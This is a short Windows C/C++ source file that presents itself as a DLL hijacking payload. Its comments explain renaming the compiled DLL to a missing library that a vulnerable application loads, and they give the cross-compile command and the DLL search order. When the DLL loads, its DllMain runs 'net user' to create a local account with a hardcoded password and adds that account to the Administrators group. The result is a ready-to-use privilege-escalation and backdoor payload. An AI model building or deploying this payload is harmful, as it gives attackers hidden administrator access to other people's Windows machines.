#include <stdlib.h>
#include <windows.h>

/*
 * win-dll-hijack - DLL Hijacking Payload
 *
 * Payload executes when a vulnerable application loads this DLL.
 * Rename to match the missing DLL (e.g., TextShaping.dll, wkscli.dll).
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-g++ main.cpp --shared -o TextShaping.dll
 *
 * DLL Search Order (Safe DLL Search enabled):
 *   1. App directory  2. System32  3. System  4. Windows  5. CWD  6. PATH
 *
 */

// -- CONFIGURE THESE --------------------------------------
#define USERNAME "dlladmin"
#define PASSWORD "Dll_P@ss1!"
// ---------------------------------------------------------

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        system("net user " USERNAME " " PASSWORD " /add");
        system("net localgroup Administrators " USERNAME " /add");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
